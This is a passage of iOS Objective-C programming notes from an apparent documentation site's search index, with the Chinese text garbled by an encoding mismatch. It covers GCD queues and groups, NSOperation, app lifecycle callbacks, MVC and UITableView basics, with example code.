Queueï¼šä¸»è°ƒåº¦é˜Ÿåˆ—ï¼Œæ˜¯ä¸€ç§ä¸²è¡Œé˜Ÿåˆ—ã€‚é€šè¿‡ä¸‹é¢çš„æ–¹å¼è·å–ï¼š\ndispatch_queue_t mainDiapatchQueue = dispatch_get_main_queue();   Global Dispatch Queueï¼šå…¨å±€å¹¶å‘é˜Ÿåˆ—ï¼Œæ˜¯å››ä¸ªå¹¶è¡Œé˜Ÿåˆ—ã€‚ç³»ç»Ÿä¸ºå®ƒä»¬å››ä¸ªåˆ’åˆ†äº†ä¼˜å…ˆçº§é¡ºåºï¼Œåˆ†åˆ«æ˜¯ é«˜ High Priorityã€é»˜è®¤ Default Priorityã€ä½ Low Priotityã€åå° Background Priorityã€‚\nä¸‹é¢æ˜¯å››æ®µè·å–è¿™äº›é˜Ÿåˆ—çš„ä»£ç ï¼š\ndispatch_queue_t globalDiapatchQueueHigh = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0);  dispatch_queue_t globalDiapatchQueueDefault = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);  dispatch_queue_t globalDiapatchQueueLow = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_LOW, 0);  dispatch_queue_t globalDiapatchQueueBackground = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0);   å¦å¤–ï¼Œå¤„ç† GCD ä¹Ÿæœ‰ä¸€äº›å¸¸è§çš„å‡½æ•°å’Œæ¦‚å¿µï¼š\n  dispatch_afterï¼šæŒ‡å®šä¸€ä¸ªæ—¶é—´ï¼Œåœ¨å»¶è¿Ÿç»™å®šçš„æ—¶é—´è¿‡åï¼Œå°†ä»»åŠ¡æ·»åŠ åˆ°ä»»åŠ¡é˜Ÿåˆ—ä¸­æ‰§è¡Œï¼ˆå¯èƒ½å› ä¸ºä¸»çº¿ç¨‹æœ¬èº«çš„å¤„ç†æœ‰å»¶è¿Ÿï¼Œå¯¼è‡´æ—¶é—´ä¸å‡†ç¡®ï¼‰ã€‚\nä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨è¿™ä¸ªå‡½æ•°çš„ä¾‹å­ï¼š\n/** * dispatch_time: è·å– dispatch_time_t ç±»å‹çš„æ—¶é—´ * DISPATCH_TIME_NOW: å½“å‰æ—¶é—´ * NSEC_PER_SEC: å•ä½ç§’ */ dispatch_time_t time = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3 * NSEC_PER_SEC));  dispatch_after(time, dispatch_get_main_queue(), ^{  NSLog(@\u0026#34;wait at least three second\u0026#34;); });   dispatch groupï¼šå¯ä»¥å°†æ•°ä¸ªå¼‚æ­¥å¤šçº¿ç¨‹ä»»åŠ¡ ç»„åˆæˆä¸€ä¸ªè°ƒåº¦ç»„ï¼Œé€šè¿‡ dispatch_group_create å‡½æ•°åˆ›å»ºï¼Œé€šè¿‡ dispatch_group_async å‡½æ•°æ·»åŠ ä»»åŠ¡ã€‚ç»„ä¸­çš„æ‰€æœ‰å¼‚æ­¥ä»»åŠ¡æ‰§è¡Œç»“æŸä¹‹åï¼Œå‘å‡ºç»Ÿä¸€çš„é€šçŸ¥ï¼Œä½¿ç”¨ dispatch_group_notify æ•è·ã€‚\næ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨è¿™äº›å‡½æ•°çš„ä¾‹å­ï¼š\ndispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0);  dispatch_group_t group = dispatch_group_create(); dispatch_group_async(group, queue, ^{ NSLog(@\u0026#34;ä¸‹è½½å›¾ç‰‡A\u0026#34;); }); dispatch_group_async(group, queue, ^{ NSLog(@\u0026#34;ä¸‹è½½å›¾ç‰‡B\u0026#34;); }); dispatch_group_async(group, queue, ^{ NSLog(@\u0026#34;ä¸‹è½½å›¾ç‰‡C\u0026#34;); });  dispatch_group_notify(group, dispatch_get_main_queue(), ^{  NSLog(@\u0026#34;å¤„ç†ä¸‹è½½å®Œæˆçš„å›¾ç‰‡\u0026#34;); }); å¦å¤–ä¹Ÿå¯ä»¥è°ƒç”¨ dispatch_group_enter å‡½æ•°ï¼Œä»è€Œå°†ä¹‹ååˆ›å»ºçš„æ‰€æœ‰çš„ä»»åŠ¡éƒ½åŠ å…¥å¯¹åº”çš„è°ƒåº¦ç»„ã€‚ä¹Ÿå¯ä»¥åœ¨ä»»åŠ¡ä»£ç ä¸­è°ƒç”¨ dispatch_group_leaveï¼Œä½¿å½“å‰çš„ä»»åŠ¡ç¦»å¼€å¯¹åº”çš„è°ƒåº¦ç»„ã€‚\næ¯”å¦‚ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•°çš„ä¾‹å­ï¼š\ndispatch_group_t group = dispatch_group_create(); dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0); dispatch_group_enter(group); dispatch_async(queue, ^{  NSBlockOperation *op = [NSBlockOperation blockOperationWithBlock:^{  NSLog(@\u0026#34;group 1\u0026#34;);  dispatch_group_leave(group);  }];  [op start]; });  dispatch_group_enter(group); dispatch_async(queue, ^{  NSBlockOperation *op = [NSBlockOperation blockOperationWithBlock:^{  NSLog(@\u0026#34;group 2\u0026#34;);  dispatch_group_leave(group);  }];  [op start]; });  dispatch_group_notify(group, dispatch_get_main_queue(), ^{  NSLog(@\u0026#34;group end\u0026#34;); });   dispatch_barrier_async å‡½æ•°ç”¨äºå°†ä¸€ä¸ªä»»åŠ¡æ·»åŠ åˆ°å¹¶å‘æ‰§è¡Œçš„ä»»åŠ¡é˜Ÿåˆ—ä¸­ï¼Œé€šè¿‡è¿™ç§æ–¹å¼æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­çš„ä»»åŠ¡ï¼š\n éœ€è¦ç­‰å¾…å‰é¢çš„æ‰€æœ‰å¹¶å‘ä»»åŠ¡æ‰§è¡Œå®Œæˆåæ‰å¼€å§‹æ‰§è¡Œï¼› åœ¨è¿™ä¸ªä»»åŠ¡æ‰§è¡Œæ—¶ï¼Œè¯¥å¹¶å‘é˜Ÿåˆ—ä¸­ä¸èƒ½æœ‰å…¶ä»–ä»»åŠ¡æ‰§è¡Œï¼› æ‰€æœ‰æ’åˆ—åœ¨è¯¥ä»»åŠ¡ä¹‹åçš„ä»»åŠ¡ï¼Œéœ€åœ¨è¿™ä¸ªä»»åŠ¡æ‰§è¡Œå®Œæˆä¹‹åæ‰§è¡Œã€‚  ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒå¤§æ¦‚æ˜¯é€šè¿‡ä¸‹é¢è¿™ä¸ªå›¾ç‰‡çš„æ–¹å¼æ‰§è¡Œçš„ï¼š\n  NSOperation #  NSOperationã€NSOperationQueue æ˜¯åŸºäº GCD æ›´é«˜ä¸€å±‚çš„å°è£…ï¼Œå®Œå…¨é¢å‘å¯¹è±¡ã€‚ä¸‹é¢ä»‹ç»ä¸€ä¸‹ä¸è¿™ä¸ªç±»ç›¸å…³çš„ä¸€äº›æ–¹æ³•ï¼š\nä»»åŠ¡çš„åˆ›å»ºè¿‡ç¨‹ï¼š\n  ä½¿ç”¨ NSOperation çš„å­ç±» NSInvocationOperationã€NSBlockOperationã€‚\n  ä¸‹é¢æ˜¯ä¸€ä¸ªä½¿ç”¨ NSInvocationOperation åˆ›å»ºä»»åŠ¡çš„ä¾‹å­ï¼š\n- (void)task1 {  for (int i = 0; i \u0026lt; 2; i++) {  [NSThread sleepForTimeInterval:2]; // æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ  NSLog(@\u0026#34;1---%@\u0026#34;, [NSThread currentThread]); // æ‰“å°å½“å‰çº¿ç¨‹  } }  - (void)useInvocationOperation {  // 1.åˆ›å»º NSInvocationOperation å¯¹è±¡  NSInvocationOperation *op = [[NSInvocationOperation alloc] initWithTarget:self selector:@selector(task1) object:nil];  // 2.è°ƒç”¨ start æ–¹æ³•å¼€å§‹æ‰§è¡Œæ“ä½œ  [op start]; }   ä¸‹é¢åˆ™æ˜¯ä¸€ä¸ªä½¿ç”¨ NSBlockOperation åˆ›å»ºä»»åŠ¡çš„ä¾‹å­ï¼š\n- (void)useBlockOperation {  // 1.åˆ›å»º NSBlockOperation å¯¹è±¡  NSBlockOperation *op = [NSBlockOperation blockOperationWithBlock:^{  for (int i = 0; i \u0026lt; 2; i++) {  [NSThread sleepForTimeInterval:2]; // æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ  NSLog(@\u0026#34;1---%@\u0026#34;, [NSThread currentThread]); // æ‰“å°å½“å‰çº¿ç¨‹  }  }];  // 2.è°ƒç”¨ start æ–¹æ³•å¼€å§‹æ‰§è¡Œæ“ä½œ  [op start]; } å¦å¤–åœ¨æ‰§è¡Œ start ä¹‹å‰ï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨ addExecutionBlock å‡½æ•°ï¼Œå‘ Operation ä¸­æ·»åŠ æ–°çš„ä»»åŠ¡ã€‚\n  é˜Ÿåˆ—çš„åˆ›å»ºè¿‡ç¨‹ï¼š\n  NSOperationQueue æ˜¯ä»»åŠ¡çš„é˜Ÿåˆ—ã€‚å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹æ³•è·å¾—è¿™æ ·çš„é˜Ÿåˆ—ï¼š\n// è·å–ä¸»é˜Ÿåˆ— NSOperationQueue *queue = [NSOperationQueue mainQueue];  // åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰é˜Ÿåˆ— NSOperationQueue *queue = [[NSOperationQueue alloc] init];   NSOperationQueue æœ‰ä¸€ä¸ªå‡½æ•°åç§°ä¸º addOperationï¼Œå³å°†ä»»åŠ¡æ·»åŠ åˆ°é˜Ÿåˆ—ä¸­ã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªç”¨ä¾‹ï¼š\n- (void)addOperationToQueue {  // 1.åˆ›å»ºé˜Ÿåˆ—  NSOperationQueue *queue = [[NSOperationQueue alloc] init];   // 2.åˆ›å»ºæ“ä½œ  // ä½¿ç”¨ NSInvocationOperation åˆ›å»ºæ“ä½œ1  NSInvocationOperation *op1 = [[NSInvocationOperation alloc] initWithTarget:self selector:@selector(task1) object:nil];   // ä½¿ç”¨ NSInvocationOperation åˆ›å»ºæ“ä½œ2  NSInvocationOperation *op2 = [[NSInvocationOperation alloc] initWithTarget:self selector:@selector(task2) object:nil];   // ä½¿ç”¨ NSBlockOperation åˆ›å»ºæ“ä½œ3  NSBlockOperation *op3 = [NSBlockOperation blockOperationWithBlock:^{  for (int i = 0; i \u0026lt; 2; i++) {  [NSThread sleepForTimeInterval:2]; // æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ  NSLog(@\u0026#34;3---%@\u0026#34;, [NSThread currentThread]); // æ‰“å°å½“å‰çº¿ç¨‹  }  }];  [op3 addExecutionBlock:^{  for (int i = 0; i \u0026lt; 2; i++) {  [NSThread sleepForTimeInterval:2]; // æ¨¡æ‹Ÿè€—æ—¶æ“ä½œ  NSLog(@\u0026#34;4---%@\u0026#34;, [NSThread currentThread]); // æ‰“å°å½“å‰çº¿ç¨‹  }  }];   // 3.ä½¿ç”¨ addOperation: æ·»åŠ æ‰€æœ‰æ“ä½œåˆ°é˜Ÿåˆ—ä¸­  [queue addOperation:op1]; // [op1 start]  [queue addOperation:op2]; // [op2 start]  [queue addOperation:op3]; // [op3 start] }   è®¾ç½®å±æ€§ maxConcurrentOperationCount å¯ä»¥æ§åˆ¶é˜Ÿåˆ—ä¸­çš„æœ€å¤§å¹¶å‘æ•°ï¼›\n  è°ƒç”¨å‡½æ•° addDependency å¯ä»¥è®¾ç½®é˜Ÿåˆ—ä¸­ä»»åŠ¡æ‰§è¡Œçš„ä¾èµ–é¡ºåºã€‚æ¯”å¦‚å¸Œæœ› op2 ä¸€å®šåœ¨ op1 ä¹‹åæ‰§è¡Œï¼š\n[op2 addDependency:op1];   NSOperation ä¹Ÿå­˜åœ¨ä»»åŠ¡ä¹‹é—´çš„ä¼˜å…ˆçº§çš„å…³ç³»ï¼Œå®ƒä»¬æ˜¯é€šè¿‡æšä¸¾å¸¸é‡å®šä¹‰çš„ï¼š\ntypedef NS_ENUM(NSInteger, NSOperationQueuePriority) {  NSOperationQueuePriorityVeryLow = -8L,  NSOperationQueuePriorityLow = -4L,  NSOperationQueuePriorityNormal = 0,  NSOperationQueuePriorityHigh = 4,  NSOperationQueuePriorityVeryHigh = 8 }; "},{"id":31,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/7.%E7%AE%80%E5%8D%95ui/","title":"7.ç®€å• Ui","section":"Objective-C\u0026SDK","content":"ç®€å• UI #  iOS App #   å®˜æ–¹æ–‡æ¡£ï¼š\n https://developer.apple.com/documentation/uikit/app_and_environment/managing_your_app_s_life_cycle  ä¸€ä¸ªå‚è€ƒäº†ä¸€ä¸ªæœ‰è¶£çš„åšå®¢ï¼š\n https://medium.com/@theiOSzone/briefly-about-the-ios-application-lifecycle-92f0c830b754   ä¸€ä¸ª iOS çš„å£°æ˜å‘¨æœŸä¸­ä¼šæœ‰ä»¥ä¸‹çš„äº”ç§çŠ¶æ€ï¼Œä¸‹å›¾åˆ—ä¸¾å®˜ç½‘ä¸­å¯¹è¿™äº”ç§çŠ¶æ€ä¹‹é—´åˆ‡æ¢çš„ç¤ºä¾‹ï¼š\nè¿™äº›å£°æ˜å‘¨æœŸçš„è½¬æ¢ä¸­ä¹Ÿæœ‰ä¸€äº›ç›¸å…³çš„ HOOK å‡½æ•°ï¼Œé‚£ä¸‹å›¾è¿™ä¸ªæµç¨‹ä¸­çš„ç¼–å·ä¸¾ä¾‹å­ï¼š\n  è¿™ä¸ªå˜æ¢æµç¨‹ä¸­ï¼Œæœ‰ä¸¤ä¸ªå£°æ˜å‘¨æœŸå‡½æ•°ï¼š\n willFinishLaunchingWithOptionsï¼šå¦‚æœä½ çš„ç¨‹åºå¯åŠ¨æˆåŠŸçš„è¯ï¼Œè¿™ä¸ªæ˜¯æ•´ä¸ªåº”ç”¨ç¬¬ä¸€æ¬¡æ‰§è¡Œçš„ä»£ç ï¼› didFinishLaunchingWithOptionsï¼šåœ¨å±å¹•ä¸Šå³å°†æ˜¾ç¤ºä»»ä½•ç”»é¢ä¹‹å‰æ‰§è¡Œçš„å‡½æ•°ï¼›    åœ¨ç¨‹åºè¿›å…¥ Active çŠ¶æ€ä¹‹åï¼Œä¼šæ‰§è¡Œï¼šapplicationDidBecomeActiveï¼›\n  applicationWillResignActiveï¼šå½“ç”¨æˆ·ç‚¹å‡»äº† Home é”®æˆ–è€…å¯åŠ¨äº†å…¶ä»–åº”ç”¨ç¨‹åºä¹‹åï¼Œä¼šæ‰§è¡Œè¿™ä¸ªå‡½æ•°ï¼›ä¸æ­¤åŒæ—¶ï¼Œç³»ç»Ÿè¿˜ä¼šå‘å‡ºä¸€ä¸ªä¿¡å· UIApplicationWillResignActiveNotificationã€‚\n  applicationDidEnterBackgroundï¼šåœ¨ä¸Šé¢çš„ä¸€ä¸ªæµç¨‹ä¹‹åï¼Œç¨‹åºä¼šä» Inactive çŠ¶æ€è¿›å…¥ Background çŠ¶æ€ï¼ŒåŒæ—¶è§¦å‘è¿™ä¸ª hook å‡½æ•°ï¼›\n  applicationWIllEnterForegroundï¼šå¦‚æœåº”ç”¨ç¨‹åºåœ¨è¢«æ“ä½œç³»ç»Ÿæ€æ­»ä¹‹å‰ï¼Œå†æ¬¡è¢«æ‰“å¼€è¿›å…¥ Foregoundï¼Œåˆ™ä¼šè§¦å‘è¿™ä¸ª hook å‡½æ•°ï¼›\n  Backgound -\u0026gt; Suspendedï¼›\n  Suspended -\u0026gt; Backgoundï¼›\nå¦‚æœåº”ç”¨è¿›å…¥åå°å 5s ä¸æ‰§è¡Œä»»ä½•è®¡ç®—ä»»åŠ¡ï¼Œæ“ä½œç³»ç»Ÿåˆ™ä¼šæŠŠå®ƒç½®ä¸ºæš‚åœçŠ¶æ€ï¼›ç›¸ååˆ™ä¼šå›åˆ°åå°çŠ¶æ€ã€‚é‚£æ˜¯è¿™ä¸¤ä¸ªçŠ¶æ€ä¹‹é—´çš„åˆ‡æ¢å¯¹ç¨‹åºå‘˜æ˜¯é€æ˜çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³• HOOK åˆ°è¿™ä¸¤ä¸ªçŠ¶æ€çš„åˆ‡æ¢ã€‚\n  applicationWillTerminateï¼šå¦‚æœåº”ç”¨ç¨‹åºåœ¨åå°æ—¶ï¼Œå°±è¢«æ“ä½œç³»ç»Ÿæ€æ­»äº†ï¼Œåˆ™ä¼šè§¦å‘è¿™ä¸ªå‡½æ•°ï¼›\n  "},{"id":32,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/8.%E5%A4%8D%E6%9D%82ui/","title":"8.å¤æ‚ Ui","section":"Objective-C\u0026SDK","content":" å‚è€ƒï¼š\n https://developer.apple.com/documentation/uikit/view_controllers?language=objc https://medium.com/@felicity.johnson.mail/pushing-popping-dismissing-viewcontrollers-a30e98731df5   å¤æ‚ UI \u0026amp;\u0026amp; å¤šè§†å›¾ #  MVC è®¾è®¡æ¨¡å¼ #  MVC æ˜¯ä¸€ç§è®¾è®¡æ¨¡å¼ã€‚æˆ‘ä»¬åˆ›å»ºçš„å¯¹è±¡æ ¹æ®å…¶èŒè´£æ¥åˆ’åˆ†ï¼Œå®ƒè¦ä¹ˆå±äº M:Modelï¼Œè¦ä¹ˆå±äº V:Viewï¼Œè¦ä¹ˆå±äºC:Controllerï¼Œä¸‹é¢æˆ‘ä»¬åˆ†åˆ«ç®€è¦ä»‹ç»ä¸€ä¸‹ Modelã€Viewã€ViewControllerã€‚\nModel #  Model ä¸€èˆ¬æ˜¯æˆ‘ä»¬å¯¹çœŸå®ä¸–ç•Œä¸­ä¸€äº›äº‹ç‰©çš„æŠ½è±¡ï¼Œæ¥å®šä¹‰çš„ä¸€äº›æ•°æ®å¯¹è±¡ï¼Œå®ƒåŒ…å«æˆ‘ä»¬æ‰€éœ€è¦çš„æ•°æ®ä»¥åŠå¯¹è¿™äº›æ•°æ®çš„æ“ä½œã€‚\nModel ä¸€èˆ¬æ˜¯è´Ÿè´£å®šä¹‰åŠå­˜å‚¨æ•°æ®ï¼Œæ˜¯ä¸ç”¨æˆ·ç•Œé¢ä¸Šç”¨äºæ˜¾ç¤ºçš„å„ä¸ªè§†è§‰å…ƒç´ æ˜¯æ— å…³çš„ã€‚\nView #  æ¥ä¸‹æ¥æ˜¯ Viewï¼Œåœ¨ iOS ä¸­ï¼ŒView ä¸€èˆ¬æ˜¯ UIKit ä¸­ UIView åŠå…¶å­ç±»çš„ä¸€äº›å®ä¾‹ï¼Œæ˜¯ç”¨æˆ·å¯ä»¥çœ‹å¾—è§çš„å¯¹è±¡ã€‚æ¯”å¦‚è¯´ UIViewï¼Œæ˜¯ç”¨äºç•Œé¢å…ƒç´ å±•ç¤ºçš„ç±»çš„åŸºç±»ï¼Œä»¥åŠ UIButtonã€UILabelã€UISliderã€UITextField ç­‰ç­‰ã€‚\nViewController #  Objective-C ä¸€èˆ¬æ˜¯ ViewController ä¸€èˆ¬æ˜¯ UIViewController åŠå…¶å­ç±»çš„å®ä¾‹ï¼Œç³»ç»Ÿæä¾›ç»™æˆ‘ä»¬çš„æ¯”è¾ƒå¸¸ç”¨çš„ ViewController æœ‰ä»¥ä¸‹çš„è¿™äº›ï¼š\n UIViewControllerï¼šç”¨æ¥å±•ç¤ºå¤šä¸ªè§†å›¾æ§åˆ¶å™¨ï¼› UITabBarControllerï¼šåœ¨ UIViewController çš„ç‰¹æ€§ä¹‹ä¸Šï¼ŒåŠ å…¥å¯ä»¥åœ¨è¿™äº›æ§åˆ¶å™¨ä¹‹é—´è¿›è¡Œåˆ‡æ¢ï¼› UINavigationControllerï¼šåœ¨ UIViewController çš„ç‰¹æ€§ä¹‹ä¸Šï¼Œåœ¨è§†å›¾æ§åˆ¶å™¨é—´è¿›è¡Œå¯¼èˆªæ§åˆ¶ï¼› UITableViewControllerï¼šå±•ç¤ºä¸€ä¸ªå•åˆ—çš„è¡¨çš„è§†å›¾æ§åˆ¶å™¨ï¼› UICollectionViewControllerï¼šä»¥åŠå±•ç¤ºé›†åˆè§†å›¾çš„ï¼› UIAlertViewControllerï¼šå±•ç¤ºå¼¹æ¡†æ¶ˆæ¯ã€‚  åœ¨é¡¹ç›®ä¸­ï¼ŒViewController å¯ä»¥é€šè¿‡æŒæœ‰çš„æ–¹å¼ç›´æ¥ä¸ View ä¸ Model è¿›è¡Œé€šä¿¡ã€‚\nViewController çš„èŒè´£æ˜¯ä»€ä¹ˆï¼Ÿ\n  è§†å›¾ç®¡ç†ï¼šè§†å›¾æ§åˆ¶å™¨æœ€é‡è¦çš„ä½œç”¨æ˜¯ç®¡ç†è§†å›¾çš„å±‚æ¬¡ç»“æ„ã€‚\næ¯ä¸ªè§†å›¾æ§åˆ¶å™¨éƒ½æœ‰ä¸€ä¸ªæ ¹è§†å›¾ï¼Œå°±æ˜¯ UIViewController çš„ view å±æ€§ï¼Œå®ƒåŒ…å«æ‰€æœ‰è§†å›¾æ§åˆ¶å™¨çš„æ˜¾ç¤ºå†…å®¹ã€‚åœ¨è¯¥æ ¹è§†å›¾ä¸­ï¼Œæ‚¨å¯ä»¥æ·»åŠ æ˜¾ç¤ºå†…å®¹æ‰€éœ€çš„è§†å›¾ã€‚è§†å›¾æ§åˆ¶å™¨å§‹ç»ˆå…·æœ‰å¯¹å…¶æ ¹è§†å›¾çš„å¼•ç”¨ï¼Œå¹¶ä¸”æ ¹è§†å›¾è§†å›¾éƒ½å…·æœ‰å¯¹å…¶å­è§†å›¾çš„å¼ºå¼•ç”¨ã€‚\n  å……å½“ View åŠ Model çš„åª’ä»‹ï¼šä¸¤è€…é€šè¿‡ ViewController è¿›è¡Œé€šä¿¡ã€‚\n  å¤„ç†ç”¨æˆ·çš„äº¤äº’ï¼šé€šå¸¸æ¥è¯´è§†å›¾å°†ç”¨æˆ·çš„äº¤äº’äº‹ä»¶ä¼ é€’ç»™è‡ªå·±çš„ä»£ç†å¯¹è±¡æ¥è¿›è¡Œäº‹ä»¶çš„å¤„ç†ï¼Œè¿™ä¸ªä»£ç†å¯¹è±¡é€šå¸¸å°±æ˜¯ ViewControllerã€‚\n  èµ„æºç®¡ç†ï¼šè§†å›¾æ§åˆ¶å™¨è´Ÿè´£ç®¡ç†ç”±å…¶åˆ›å»ºçš„å¯¹è±¡ã€‚\nåœ¨ UIViewController å­ç±»ä¸­ï¼Œæ˜¯æˆ‘ä»¬å¼€å‘è€…è´Ÿè´£ç®¡ç†æ˜¾å¼åˆ›å»ºçš„ä»»ä½•å¯¹è±¡ã€‚ç”±äºç§»åŠ¨è®¾å¤‡çš„å†…å­˜æ˜¯æœ‰é™çš„ï¼Œå½“è®¾å¤‡çš„å¯ç”¨å†…å­˜ä¸è¶³æ—¶ï¼ŒUIKit ä¼šè¦æ±‚åº”ç”¨ç¨‹åºé‡Šæ”¾ä»–ä»¬ä¸å†éœ€è¦çš„ä»»ä½•èµ„æºã€‚\n  è¿™æ ·åšçš„ä¸€ç§æ–¹æ³•æ˜¯è°ƒç”¨è§†å›¾æ§åˆ¶å™¨çš„ didReceiveMemoryWarning æ–¹æ³•ï¼šåœ¨è¿™ä¸ªæ–¹æ³•é‡Œåˆ é™¤å¯¹ä¸å†éœ€è¦çš„å¯¹è±¡ï¼Œæˆ–è€…ç¨åå¯ä»¥è½»æ¾åœ°é‡æ–°åˆ›å»ºçš„å¯¹è±¡çš„å¼•ç”¨ã€‚\n  ä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•åˆ é™¤ç¼“å­˜çš„æ•°æ®ã€‚åœ¨å‘ç”Ÿå†…å­˜ä¸è¶³çš„æƒ…å†µæ—¶ï¼Œå°½å¯èƒ½å¤šåœ°é‡Šæ”¾å†…å­˜æ˜¯éå¸¸é‡è¦ã€‚æ¶ˆè€—è¿‡å¤šå†…å­˜çš„åº”ç”¨ç¨‹åºå¯èƒ½ä¼šè¢«ç³»ç»Ÿå½»åº•ç»ˆæ­¢ä»¥æ¢å¤å†…å­˜ã€‚\n    OC ä¸­çš„å†…å®¹ VC ç§ç±» #  UIScrollView #  è¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„ç±»ï¼ŒUITableView, UICollectionView, UITextView è¿™äº›è§†å›¾éƒ½æ˜¯ç»§æ‰¿è‡ªå®ƒã€‚åœ¨ iOS ä¸­ï¼Œæ»šåŠ¨è§†å›¾ UIScrollView é€šå¸¸ç”¨äºæŸ¥çœ‹å¤§äºå±å¹•çš„å†…å®¹ã€‚\nä¸¤ä¸ªæ¯”è¾ƒé‡è¦çš„å±æ€§ï¼š\n frameï¼šè¿™ä¸ªå±æ€§æ§åˆ¶äº† UIScrollView çš„ä½ç½®ä»¥åŠå¤§å°ï¼›å¯ä»¥ç†è§£ä¸ºçª—å£çš„å¤§å°ï¼› ContentSizeï¼šå®šä¹‰äº† UIScrollView èƒ½æ˜¾ç¤ºçš„å†…å®¹åŒºåŸŸçš„å¤§å°ï¼›å¯ä»¥ç†è§£ä¸ºå›¾ç‰‡çš„å¤§å°ï¼›  å¾ˆæ˜¾ç„¶ï¼Œå¦‚æœå°† frame çš„å®½åº¦æˆ–è€…é«˜åº¦è®¾ç½®ä¸ºæœ€å¤§ï¼Œå°±å¯ä»¥å®ç°æ‹–åŠ¨å’Œåˆ†é¡µäº†ã€‚ä½†æ˜¯å¦‚ä½•è®©å®ƒæ°å¥½åœæ­¢åœ¨ä¸‹ä¸€ä¸ªè§†å›¾å‘¢ï¼Œåªéœ€è¦è®¾ç½®ä¸‹é¢çš„å±æ€§ï¼š\nscrollView.pagingEnable = YES; UITableView #  UIScrollView çš„å­ç±»ï¼Œå¯ä»¥é€šè¿‡ initWithFrame åˆ›å»ºï¼š\n- (instancetype)initWithFrame:(CGRect)frame style:(UITableViewStyle)style NS_DESIGNATED_INITIALIZER; // must specify style at creation. // - initWithFrame: calls this with UITableViewStylePlain åœ¨åˆ›å»ºæ—¶å¿…é¡»æŒ‡å®šä¸€ä¸ªåˆ›å»ºé£æ ¼ï¼Œæœ‰ä»¥ä¸‹ä¸¤ä¸ªé€‰é¡¹ï¼š\n UITableViewStylePlainï¼šé€šè®¯å½•ç±»ä¼¼é£æ ¼ï¼› UITableViewStyleGroupedï¼šç³»ç»Ÿè®¾ç½®ç±»ä¼¼é£æ ¼ã€‚  UITableView ä¸»è¦æ˜¯ä»¥ä¸‹çš„å‡ ä¸ªéƒ¨åˆ†ç»„æˆï¼š\n+---------------+ \u0026gt;+-----------------------+ | | -/ | | | header view | / | section header view | | | -/ | | ----------------- / ------------------------- | section 1 | / | cell 1 | ----------------- -/ ------------------------- | ... | / | ... | | ... |-/ | ... | ----------------/ ------------------------- | section 2 | | cell 2 | -----------------\\ ------------------------- | section 3 | -\\ | cell 3 | ----------------- -\\ ------------------------- | | -\\ | | | footer view | -\\ | section footer view | | | -\\ | | +---------------+ -\u0026gt;+-----------------------+ å¦‚ä½•åˆ›å»º UITableView çš„å­è§†å›¾ï¼Ÿ\n  å¯¹äº UITableViewï¼Œæˆ‘ä»¬ä¸€èˆ¬ä¸é€šè¿‡åˆ›å»ºå­è§†å›¾å¹¶æ·»åŠ å…¶ä¸º UITableView çš„å­è§†å›¾æ¥å±•ç¤ºå†…å®¹ï¼›\n  ä¸€èˆ¬æŠŠè¿™ä¸ªå·¥ä½œäº¤ç»™ä¸€ä¸ªéµå®ˆ UITableViewDataSource åè®®çš„å¯¹è±¡ï¼š\n@optional - (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView; // ç”¨äºæŒ‡å®šä¸€ä¸ª TableView ä¸­æœ‰å¤šå°‘ä¸ª Sectionã€‚å¯é€‰æ–¹æ³•ï¼Œé»˜è®¤è¿”å›ä¸º 1  - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section; // è¿™ä¸ªæ–¹æ³•å‘Šè¯‰ UITableView ç¬¬å‡ ä¸ª section è¦æ˜¾ç¤ºå¤šå°‘è¡Œå†…å®¹  - (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath; // åœ¨æŒ‡å®šçš„ indexPath ä¸Šå…·ä½“çš„è¦å±•ç¤ºçš„ Cell é•¿ä»€ä¹ˆæ ·å­   PostScriptï¼šä¸Šé¢çš„ç¬¬ä¸‰ä¸ªæ–¹æ³•ï¼Œå¼•å…¥äº† NSIndexPath è¿™ä¸ªç±»å‹ï¼Œä»–ç”¨äºæŒ‡å®šä¸€ä¸ª Cell çš„ä½ç½®ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„ç±»æ–¹æ³•ç›´æ¥åˆ›å»ºè¿™ä¸ªå¯¹è±¡ï¼š\n+ (instancetype)indexPathForRow:(NSInteger)row inSection:(NSInteger)section; + (instancetype)indexPathForItem:(NSInteger)item inSection:(NSInteger)section NS_AVAILABLE_IOS(6_0);   UITableViewCell #  ä¸Šé¢ UITableViewDataSource åè®®çš„ç¬¬ä¸‰ä¸ªæ–¹æ³•æŒ‡å®šäº† UITableViewCell è¿™ä¸ªå¯¹è±¡ï¼Œé¡¾åæ€ä¹‰ï¼Œä»–å°±æ˜¯ç”¨æ¥æŒ‡å®š cell æ 